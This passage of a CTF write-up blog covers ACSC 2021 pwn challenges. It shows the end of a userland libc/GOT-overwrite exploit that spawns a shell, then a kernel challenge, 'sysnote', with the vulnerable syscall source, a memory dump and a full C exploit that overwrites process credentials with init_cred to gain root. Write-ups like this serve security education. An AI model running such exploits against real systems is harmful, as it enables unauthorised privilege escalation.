<span class="n">libc_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'</span><span class="se">\x7f</span><span class="s">'</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="nb">exit</span>

<span class="n">clear</span><span class="p">()</span>

<span class="n">a</span> <span class="o">=</span> <span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s">'1234'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'test1'</span><span class="p">)</span>
<span class="n">b</span> <span class="o">=</span> <span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s">'4321'</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">.</span><span class="n">strlen</span> <span class="o">-</span> <span class="mi">8</span><span class="p">))</span>
<span class="n">delete</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>

<span class="n">c</span> <span class="o">=</span> <span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\x60</span><span class="s">'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'hack'</span><span class="p">)</span>

<span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
    <span class="n">edit</span><span class="p">(</span><span class="n">p32</span><span class="p">((</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x18b660</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">),</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">))</span>

<span class="k">else</span><span class="p">:</span> 
    <span class="n">edit</span><span class="p">(</span><span class="n">p32</span><span class="p">((</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xb4d30</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">),</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">))</span>

<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt;&gt;&gt; '</span><span class="p">,</span> <span class="s">'/bin/sh'</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></div>
<p>Flag: <code class="language-plaintext highlighter-rouge">ACSC{PWN_1S_FUN_5W33T_D3liC1ous :)}</code></p>

<h1 id="sysnote---400-pts---5-solves">sysnote - 400 pts - 5 solves</h1>
<p>This is a kernel pwn challenge. Some syscalls are added into kernel. This was special for me because I recently learned some kernel pwning techniques and this was my first time solving a kernel challenges during a CTF. I will skip some beginner stuff here, for that checkout my <a href="/kernel-pwn/2021/09/10/pass-grabcon.html">writeup</a> for a kernel challenge.<br />
Code for the syscalls is below:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;linux/kernel.h&gt;
#include &lt;linux/syscalls.h&gt;
#include &lt;linux/compiler.h&gt;
#include &lt;linux/export.h&gt;
#include &lt;linux/fault-inject-usercopy.h&gt;
#include &lt;linux/kasan-checks.h&gt;
#include &lt;linux/thread_info.h&gt;
#include &lt;linux/uaccess.h&gt;
#include &lt;linux/kernel.h&gt;
#include &lt;linux/errno.h&gt;
#include &lt;linux/mm.h&gt;
</span>
<span class="cp">#define MAX_LENGTH 4096
</span>
<span class="c1">// Linux version 5.13.0+ (zzoru@ubuntu) (gcc (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0, GNU ld (GNU Binutils) 2.36.1) #20 SMP Sat Aug 14 07:01:51 PDT 2021</span>

<span class="cm">/* Looks like there is no strcpy_from_user function in kernel... so i made it! */</span>
<span class="kt">long</span> <span class="nf">strcpy_from_user</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">dst</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">src</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">max_addr</span><span class="p">,</span> <span class="n">src_addr</span><span class="p">;</span>
    <span class="kt">long</span> <span class="n">res</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="n">might_fault</span><span class="p">();</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">should_fail_usercopy</span><span class="p">())</span>
		<span class="k">return</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
	<span class="n">max_addr</span> <span class="o">=</span> <span class="n">user_addr_max</span><span class="p">();</span>
	<span class="n">src_addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">untagged_addr</span><span class="p">(</span><span class="n">src</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">likely</span><span class="p">(</span><span class="n">src_addr</span> <span class="o">&lt;</span> <span class="n">max_addr</span><span class="p">))</span> <span class="p">{</span>
        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">max</span> <span class="o">=</span> <span class="n">max_addr</span> <span class="o">-</span> <span class="n">src_addr</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">user_read_access_begin</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">max</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">while</span> <span class="p">(</span><span class="n">max</span><span class="p">)</span> <span class="p">{</span>
                <span class="kt">char</span> <span class="n">c</span><span class="p">;</span>

                <span class="n">unsafe_get_user</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">src</span><span class="o">+</span><span class="n">res</span><span class="p">,</span> <span class="n">efault</span><span class="p">);</span>
                
                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">c</span><span class="p">)</span>
                    <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
                <span class="n">dst</span><span class="p">[</span><span class="n">res</span><span class="p">]</span> <span class="o">=</span> <span class="n">c</span><span class="p">;</span>
                <span class="n">res</span><span class="o">++</span><span class="p">;</span>
                <span class="n">max</span><span class="o">--</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="n">user_read_access_end</span><span class="p">();</span>
            <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="nl">efault:</span>
	<span class="k">return</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">SYSCALL_DEFINE0</span><span class="p">(</span><span class="n">current_addr</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">return</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">current</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">SYSCALL_DEFINE1</span><span class="p">(</span><span class="n">add_note</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="p">,</span> <span class="n">str</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">return</span> <span class="n">strcpy_from_user</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">note</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">SYSCALL_DEFINE0</span><span class="p">(</span><span class="n">delete_note</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">note</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">note</span><span class="p">));</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">SYSCALL_DEFINE1</span><span class="p">(</span><span class="n">show_note</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="p">,</span> <span class="n">str</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">return</span> <span class="n">copy_to_user</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">str</span><span class="p">,</span> <span class="n">current</span><span class="o">-&gt;</span><span class="n">note</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">note</span><span class="p">));</span>
<span class="p">}</span>

<span class="n">SYSCALL_DEFINE1</span><span class="p">(</span><span class="n">copy_note</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="p">,</span> <span class="n">str</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">return</span> <span class="n">copy_from_user</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">note</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">str</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">note</span><span class="p">));</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Looking at the code reveals that these syscalls deal with current <code class="language-plaintext highlighter-rouge">task_struct</code> and its member <code class="language-plaintext highlighter-rouge">note</code>. <code class="language-plaintext highlighter-rouge">note</code> is not a member of <code class="language-plaintext highlighter-rouge">task_struct</code> in the actual kernel, it was added in <code class="language-plaintext highlighter-rouge">k.patch</code> file just before the <code class="language-plaintext highlighter-rouge">cred struct</code>s of the current process.</p>
<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">[redacted]</span>
diff --git a/arch/x86/entry/syscalls/syscall_64.tbl b/arch/x86/entry/syscalls/syscall_64.tbl
<span class="gh">index ce18119ea0d0..5c4421684aa3 100644
</span><span class="gd">--- a/arch/x86/entry/syscalls/syscall_64.tbl
</span><span class="gi">+++ b/arch/x86/entry/syscalls/syscall_64.tbl
</span><span class="p">@@ -413,3 +413,9 @@</span>
 547	x32	pwritev2		compat_sys_pwritev64v2
 # This is the end of the legacy x32 range.  Numbers 548 and above are
 # not special and are not to be used for x32-specific syscalls.
<span class="gi">+
+548	64	add_note			sys_add_note
+549	64	delete_note			sys_delete_note
+550	64	show_note			sys_show_note
+551	64	copy_note			sys_copy_note
+552    64  current_addr        sys_current_addr
</span><span class="err">\</span> No newline at end of file
<span class="gh">diff --git a/include/linux/sched.h b/include/linux/sched.h
index 32813c345115..2b74ab806a32 100644
</span><span class="gd">--- a/include/linux/sched.h
</span><span class="gi">+++ b/include/linux/sched.h
</span><span class="p">@@ -946,6 +946,8 @@</span> struct task_struct {
 	struct posix_cputimers_work	posix_cputimers_work;
 #endif
 
<span class="gi">+
+	char			note[1024];    &lt;----- here
</span> 	/* Process credentials: */
 
 	/* Tracer's credentials at attach: */
<span class="err">[redacted]</span>
</code></pre></div></div>
<p>We also get the syscall numbers for the new syscalls. Following is an overview of each syscall:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">add_note</code>: copies a user provided buffer into the note using a dangerous <code class="language-plaintext highlighter-rouge">strcpy_from_user</code> function (buffer overflow; doesn’t allow null bytes)</li>
  <li><code class="language-plaintext highlighter-rouge">delete_note</code>: nulls the whole note</li>
  <li><code class="language-plaintext highlighter-rouge">show_note</code>: copies note (until a null) to a userland buffer</li>
  <li><code class="language-plaintext highlighter-rouge">copy_node</code>: copies 1024 bytes from user buffer to note (allows null bytes)</li>
  <li><code class="language-plaintext highlighter-rouge">current_addr</code>: gives address of current process’s <code class="language-plaintext highlighter-rouge">task_struct</code><br /></li>
</ul>

<p>Since the note is adjacent to the <code class="language-plaintext highlighter-rouge">cred struct</code>, the best way to become root is to overwrite <code class="language-plaintext highlighter-rouge">cred</code> with <code class="language-plaintext highlighter-rouge">init_cred</code><br />
But for that, we need a kernel leak. Since we get <code class="language-plaintext highlighter-rouge">current_task</code> using <code class="language-plaintext highlighter-rouge">current_addr</code> syscall, I checked <code class="language-plaintext highlighter-rouge">task_struct</code> for kernel pointers and found a kernel pointer after some values from <code class="language-plaintext highlighter-rouge">current_cred</code> pointer.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xffff8880043f2da8:  0x0000000000000000   0xffff888004433780 &lt;---- real_cred
0xffff8880043f2db8:  0xffff888004433780   0x0000000000000000 &lt;---- cred
0xffff8880043f2dc8:  0x0074696f6c707865   0x0000000000000064
0xffff8880043f2dd8:  0x0000000000000000   0x0000000000000000
0xffff8880043f2de8:  0xffff8880043f2de8   0xffff8880043f2de8
0xffff8880043f2df8:  0xffff8880044107c0   0xffff88800312c840
0xffff8880043f2e08:  0x0000000000000000   0xffffffff8244e8a0 &lt;---- kernel pointer
</code></pre></div></div>
<p>Initially, I tried overwriting values upto this pointer, copying note, calculate kernel base, overwrite <code class="language-plaintext highlighter-rouge">cred</code> with <code class="language-plaintext highlighter-rouge">init_cred</code> and spawn a shell. But, becuase null bytes are not allowed in <code class="language-plaintext highlighter-rouge">strcpy_from_user</code> and leaving random values makes the kernel panic.<br />
I was stuck here for a long time then I decided to overwrite <code class="language-plaintext highlighter-rouge">cred</code> to <code class="language-plaintext highlighter-rouge">address of the kernel pointer - 4</code> and use <code class="language-plaintext highlighter-rouge">getuid</code> to read its lower 4 bytes and <code class="language-plaintext highlighter-rouge">getgid</code> for upper 4 bytes. <code class="language-plaintext highlighter-rouge">-4</code> because in <code class="language-plaintext highlighter-rouge">cred struct</code> the first <code class="language-plaintext highlighter-rouge">int</code> is a magic number and <code class="language-plaintext highlighter-rouge">uid</code> is stored after the magic number. Reading the lower 4 bytes worked fine but trying to read upper 4 bytes always gave <code class="language-plaintext highlighter-rouge">0xfffe</code> instead of <code class="language-plaintext highlighter-rouge">0xffffffff</code>; because the upper 4 bytes were always <code class="language-plaintext highlighter-rouge">0xffffffff</code> and it correspond to <code class="language-plaintext highlighter-rouge">-1</code>, so, it thought it was an error. So, I just hardcoded <code class="language-plaintext highlighter-rouge">0xffffffff</code> because it was same everytime.<br />
After getting the pointer, I replaced <code class="language-plaintext highlighter-rouge">real_cred</code> and <code class="language-plaintext highlighter-rouge">cred</code> with <code class="language-plaintext highlighter-rouge">init_cred</code> and spawned a shell.<br />
You just have to be careful about not printing anything before repairing <code class="language-plaintext highlighter-rouge">cred</code> because <code class="language-plaintext highlighter-rouge">write</code> syscall does some checks which are done using <code class="language-plaintext highlighter-rouge">selinux_file_permission</code> which are based on <code class="language-plaintext highlighter-rouge">cred</code>, having an invalid pointer will make the kernel panic.<br />
Final exploit:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;syscall.h&gt;
#include &lt;stdint.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
</span>
<span class="cp">#define ADD_NOTE     548
#define DEL_NOTE     549
#define SHOW_NOTE    550
#define COPY_NOTE    551
#define CURRENT_ADDR 552
</span>
<span class="kt">uint64_t</span> <span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
<span class="kt">uint64_t</span> <span class="n">copy</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>

<span class="kt">void</span> <span class="nf">make_copy</span><span class="p">(</span><span class="kt">int</span> <span class="n">offset</span><span class="p">){</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="sc">'A'</span><span class="p">,</span> <span class="p">(</span><span class="mi">128</span> <span class="o">+</span> <span class="n">offset</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">);</span>

    <span class="n">syscall</span><span class="p">(</span><span class="n">ADD_NOTE</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
    <span class="n">syscall</span><span class="p">(</span><span class="n">SHOW_NOTE</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>

    <span class="n">copy</span><span class="p">[</span><span class="mi">128</span> <span class="o">+</span> <span class="n">offset</span><span class="p">]</span> <span class="o">=</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span> <span class="o">+</span> <span class="n">offset</span><span class="p">];</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
    <span class="kt">uint64_t</span> <span class="n">current_addr</span> <span class="o">=</span> <span class="n">syscall</span><span class="p">(</span><span class="n">CURRENT_ADDR</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"current task: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">current_addr</span><span class="p">);</span>

    <span class="n">make_copy</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>

    <span class="kt">uint64_t</span> <span class="n">current_cred</span> <span class="o">=</span> <span class="n">copy</span><span class="p">[</span><span class="mi">128</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
    <span class="kt">uint64_t</span> <span class="n">note</span> <span class="o">=</span> <span class="n">current_addr</span> <span class="o">+</span> <span class="mh">0xab8</span> <span class="o">-</span> <span class="mi">8</span><span class="o">*</span><span class="mi">2</span> <span class="o">-</span> <span class="mi">1024</span><span class="p">;</span>
    <span class="n">copy</span><span class="p">[</span><span class="mi">128</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">]</span>     <span class="o">=</span> <span class="n">current_addr</span> <span class="o">+</span> <span class="mh">0xb10</span> <span class="o">-</span> <span class="mi">4</span><span class="p">;</span>
    <span class="n">buf</span><span class="p">[</span><span class="mi">128</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">current_addr</span> <span class="o">+</span> <span class="mh">0xb10</span> <span class="o">-</span> <span class="mi">4</span><span class="p">;</span>
    <span class="n">buf</span><span class="p">[</span><span class="mi">128</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">current_addr</span> <span class="o">+</span> <span class="mh">0xb10</span> <span class="o">-</span> <span class="mi">4</span><span class="p">;</span>

    <span class="n">syscall</span><span class="p">(</span><span class="n">ADD_NOTE</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>

    <span class="kt">uint32_t</span> <span class="n">lower</span> <span class="o">=</span> <span class="n">getuid</span><span class="p">();</span>
    <span class="kt">uint32_t</span> <span class="n">upper</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>

    <span class="kt">uint32_t</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">lower</span><span class="p">,</span> <span class="n">upper</span><span class="p">};</span> <span class="c1">// it works this way ¯\_(ツ)_/¯</span>
    <span class="kt">uint64_t</span> <span class="n">leak</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">tmp</span><span class="p">;</span>

    <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">]</span>     <span class="o">=</span> <span class="n">current_cred</span><span class="p">;</span>
    <span class="n">buf</span><span class="p">[</span><span class="mi">128</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">current_cred</span><span class="p">;</span>
    <span class="n">buf</span><span class="p">[</span><span class="mi">128</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">current_cred</span><span class="p">;</span>

    <span class="n">syscall</span><span class="p">(</span><span class="n">ADD_NOTE</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">leak</span><span class="p">);</span>

    <span class="kt">uint64_t</span> <span class="n">kbase</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="mh">0x144e8a0</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">init_cred</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0x144eac0</span><span class="p">;</span>

    <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">]</span>     <span class="o">=</span> <span class="n">init_cred</span><span class="p">;</span>
    <span class="n">buf</span><span class="p">[</span><span class="mi">128</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">init_cred</span><span class="p">;</span>
    <span class="n">buf</span><span class="p">[</span><span class="mi">128</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">init_cred</span><span class="p">;</span>

    <span class="n">syscall</span><span class="p">(</span><span class="n">ADD_NOTE</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>

    <span class="n">system</span><span class="p">(</span><span class="s">"whoami; sh"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Flag: <code class="language-plaintext highlighter-rouge">ACSC{m0mmy, 1 r34lly h4t3 7hi5 n0te}</code></p>

<p>Lastly, props to the organizers for amazing CTF.<br />
If you have any question, hit me on discord <code class="language-plaintext highlighter-rouge">stdnoerr#7880</code></p>

	  </div>

		
		<ul class="tag_box list-unstyled list-inline">
		  <li><i class="fa fa-folder-open"></i></li>
		  
		  
			 
				<li><a href="/categories.html#ctf-ref">
					ctf <span>(1)</span>
					
				</a></li>
			
		  
		</ul>
		  

		
		<ul class="list-inline">
		  <li><i class="fa fa-tags"></i></li>
		  
		  
			 
				<li>
					<a href="/tags.html#writeup-ref">
					writeup <span>(2)</span>
					,
					</a>
				</li>
			 
				<li>
					<a href="/tags.html#kernel-ref">
					kernel <span>(2)</span>
					,
					</a>
				</li>
			 
				<li>
					<a href="/tags.html#stack-ref">
					stack <span>(3)</span>
					,
					</a>
				</li>
			 
				<li>
					<a href="/tags.html#ROP-ref">
					ROP <span>(2)</span>
					,
					</a>
				</li>
			 
				<li>
					<a href="/tags.html#buffer-overflow-ref">
					buffer-overflow <span>(3)</span>
					,
					</a>
				</li>
			 
				<li>
					<a href="/tags.html#heap-ref">
					heap <span>(2)</span>
					
					</a>
				</li>
			
		  
		  
		</ul>
		  

		<hr>

		<div>
      <section class="share col-sm-6">
        <h4 class="section-title">Share Post</h4>
        <a class="btn btn-default btn-sm twitter" href="http://twitter.com/share?text=ACSC 2021 - Pwn challenges&via=stdnoerr"
           onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
          <i class="fa fa-twitter fa-lg"></i>
          Twitter
        </a>
        <a class="btn btn-default btn-sm facebook" href="https://www.facebook.com/sharer/sharer.php"
           onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
          <i class="fa fa-facebook fa-lg"></i>
          Facebook
        </a>
        <a class="btn btn-default btn-sm gplus"
           onclick="window.open('https://plus.google.com/share?url='+window.location.href, 'google-plus-share', 'width=490,height=530');return false;">
          <i class="fa fa-google-plus fa-lg"></i>
          Google+
        </a>
      </section>

      <section class="col-sm-6 author">
        <img src="//www.gravatar.com/avatar/fe66ffe3df09aee77973014c55d36d1c" class="img-rounded author-image" />
        <h4 class="section-title author-name">stdnoerr</h4>
        <p class="author-bio">CTFer | pwner | wanna learn everything</p>
      </section>
    </div>

    <div class="clearfix"></div>

		<ul class="pager">
		  
		  <li class="previous"><a href="/kernel-pwn/2021/09/10/pass-grabcon.html" title="GrabCON 2021 - Paas">&larr; Previous</a></li>
		  
		  
		  <li class="next"><a href="/writeup/2021/09/28/HacktivityCTF2021-pawn-shop.html" title="HacktivityCTF 2021 pawn shop challenge writeup">Next &rarr;</a></li>
		  
		</ul>

		<hr>
	</div>
	
	<div class="col-sm-2 sidebar-2">
	
	</div>
</article>
<div class="clearfix"></div>





		<footer>
			<hr/>
			<p>
				&copy; 2021 stdnoerr with <a href="http://jekyllrb.com/">Jekyll</a>. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
			</p>
		</footer>
	</div>

	<script type="text/javascript" src="/assets/resources/jquery/jquery.min.js"></script>
	<script type="text/javascript" src="/assets/resources/bootstrap/js/bootstrap.min.js"></script>
	<script type="text/javascript" src="/assets/js/app.js"></script>
</body>
</html>



<!-- Asynchronous Google Analytics snippet -->
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'stdnoerr_blog', 'auto');
  ga('send', 'pageview');
</script>

